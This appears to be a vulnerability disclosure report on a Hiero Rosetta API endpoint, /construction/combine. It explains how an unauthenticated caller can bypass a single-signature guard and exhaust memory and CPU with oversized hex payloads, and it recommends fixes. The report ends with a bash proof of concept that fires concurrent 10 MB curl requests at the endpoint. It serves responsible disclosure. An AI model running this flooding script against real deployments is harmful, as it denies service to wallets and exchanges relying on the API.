### Title
Unbounded `UnsignedTransaction` Payload in `/construction/combine` Enables Resource Exhaustion

### Summary
The `ConstructionCombine` handler in `rosetta/app/services/construction_service.go` passes the caller-supplied `UnsignedTransaction` hex string directly to `unmarshallTransactionFromHexString`, which performs `hex.DecodeString` (allocating `len(input)/2` bytes) followed by `hiero.TransactionFromBytes` (protobuf deserialization). No application-level body-size limit exists, so any unauthenticated caller who includes at least one dummy signature can force arbitrarily large allocations and CPU work, raising resource consumption well above the 30% baseline threshold.

### Finding Description
**Exact code path:**

`rosetta/app/services/construction_service.go`, `ConstructionCombine()` (lines 54–97):
```
if len(request.Signatures) == 0 {          // only guard — trivially bypassed
    return nil, errors.ErrNoSignature
}
transaction, rErr := unmarshallTransactionFromHexString(request.UnsignedTransaction)
```

`unmarshallTransactionFromHexString()` (lines 658–674):
```go
transactionBytes, err := hex.DecodeString(tools.SafeRemoveHexPrefix(transactionString))
// allocates len(transactionString)/2 bytes unconditionally
transaction, err := hiero.TransactionFromBytes(transactionBytes)
// full protobuf deserialization of attacker-controlled bytes
```

**Root cause:** The function assumes `UnsignedTransaction` is a small, well-formed Hiero transaction produced by the legitimate `/construction/payloads` flow. No length check or `http.MaxBytesReader` wrapper is applied anywhere in the server setup (`main.go` lines 220–227 configure only timeouts, not body-size limits). The Rosetta SDK router also does not impose a body-size cap.

**Why the only guard fails:** The sole pre-deserialization check (`len(request.Signatures) == 0`) is bypassed by including any single dummy signature object in the JSON body. The signature is not verified until *after* the expensive deserialization completes (lines 72–86).

**Exploit flow:**
1. Attacker constructs a JSON body with one dummy `signatures` entry and a maximally large `unsigned_transaction` hex string (e.g., 50 MB of valid hex characters).
2. The Go HTTP server reads the body within the 5-second `ReadTimeout` window (default `5000000000` ns); on a local or high-bandwidth path this allows tens of MB per request.
3. `hex.DecodeString` allocates ~25 MB of raw bytes per request.
4. `hiero.TransactionFromBytes` attempts protobuf deserialization of those bytes, consuming additional CPU.
5. Attacker fires multiple concurrent requests (no in-flight limit at the application layer).

### Impact Explanation
Each oversized request forces the Go runtime to allocate and GC large byte slices and triggers protobuf parsing work proportional to payload size. With a handful of concurrent connections sending ~50 MB payloads, heap pressure and GC pauses can spike CPU and memory well above 30% of the 24-hour baseline on a normally-loaded node. In the worst case this degrades or denies service to legitimate Rosetta API consumers (wallet software, exchanges using the Coinbase Rosetta standard).

### Likelihood Explanation
No authentication or API key is required to reach `/construction/combine`; the endpoint is intentionally public per the Rosetta specification. The only precondition is network reachability to port 5700. The attack is trivially scriptable with `curl` or any HTTP client. The Traefik rate-limit middleware (`average: 10`, `inFlightReq: 5`) defined in `charts/hedera-mirror-rosetta/values.yaml` (lines 149–166) is **opt-in** (`global.middleware: false` by default, line 95) and is absent from the application code itself, so deployments without the Helm chart or with `global.middleware: false` have no rate limiting at all.

### Recommendation
1. **Enforce a body-size limit at the HTTP layer** in `main.go` by wrapping the handler with `http.MaxBytesReader` (e.g., 1 MB) before JSON decoding, or by setting `http.Server.MaxHeaderBytes` and adding a middleware that calls `http.MaxBytesReader(w, r.Body, maxBytes)`.
2. **Add an explicit length check in `unmarshallTransactionFromHexString`** before calling `hex.DecodeString`: reject any input whose hex-decoded length would exceed the maximum valid Hiero transaction size (~6 KB).
3. **Enable the Traefik middleware by default** (`global.middleware: true`) and document it as a required security control, not an optional one.

### Proof of Concept
```bash
# Generate a 10 MB hex string of valid hex characters (all zeros = valid hex, invalid protobuf → fast rejection after decode)
LARGE_HEX=$(python3 -c "print('0' * 20_000_000)")  # 10 MB decoded

# Send to /construction/combine with one dummy signature to bypass the only guard
curl -s -X POST http://<rosetta-host>:5700/construction/combine \
  -H 'Content-Type: application/json' \
  -d "{
    \"network_identifier\": {\"blockchain\": \"Hiero\", \"network\": \"testnet\"},
    \"unsigned_transaction\": \"${LARGE_HEX}\",
    \"signatures\": [{
      \"signing_payload\": {\"hex_bytes\": \"00\", \"signature_type\": \"ed25519\"},
      \"public_key\": {\"hex_bytes\": \"$(python3 -c "print('00'*32)")\", \"curve_type\": \"edwards25519\"},
      \"signature_type\": \"ed25519\",
      \"hex_bytes\": \"$(python3 -c "print('00'*64)")\"
    }]
  }" &

# Repeat concurrently to amplify resource consumption
for i in $(seq 1 20); do <above curl command> & done
```

Each request forces `hex.DecodeString` to allocate 10 MB and then `hiero.TransactionFromBytes` to attempt protobuf parsing. Twenty concurrent requests = 200 MB of simultaneous allocation plus CPU for GC and protobuf parsing, reliably exceeding the 30% resource-increase threshold on a standard deployment. func unmarshallTransactionFromHexString(transactionString string) (hiero.TransactionInterface, *rTypes.Error) {
```go
	transactionBytes, err := hex.DecodeString(tools.SafeRemoveHexPrefix(transactionString))
	if err != nil {
		return nil, errors.ErrTransactionDecodeFailed
	}

	transaction, err := hiero.TransactionFromBytes(transactionBytes)
	if err != nil {
		return nil, errors.ErrTransactionUnmarshallingFailed
	}

	if rErr := isSupportedTransactionType(transaction); rErr != nil {
		return nil, rErr
	}

	return transaction, nil
}
```
